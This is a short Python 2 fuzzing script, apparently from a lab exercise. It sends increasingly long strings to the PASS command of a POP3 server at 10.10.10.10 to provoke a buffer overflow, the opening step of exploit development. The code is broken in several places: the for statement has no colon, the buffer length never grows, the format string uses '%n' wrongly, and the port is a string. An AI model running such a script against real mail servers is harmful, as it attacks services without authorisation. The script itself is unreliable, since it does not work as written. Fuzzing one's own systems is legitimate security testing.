#!/usr/bin/python
import socket

#this is a base fuzzing script for the Password input on a POP3 connection
IP_ADDRESS = '10.10.10.10'
PORT = '110'
start_iteration = 1 
stop_iteration =100
buffer_increment = 200

for iteration_count in range (start_iteration, stop_iteration)
  buffer_length = start_iteration*buffer_increment
  print "Fuzzing PASS %n with %s bytes" % (iteration_count, buffer_length )
  buffer_string = "A"*buffer_length
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect((IP_ADDRESS,PORT))

#POP Protocol interaction  
  s.recv(1024)
  s.send('USER test\r\n')
  s.recv(1024)
  s.send('PASS ' + buffer_string + '\r\n')
  s.send('QUIT\r\n')
  s.close()
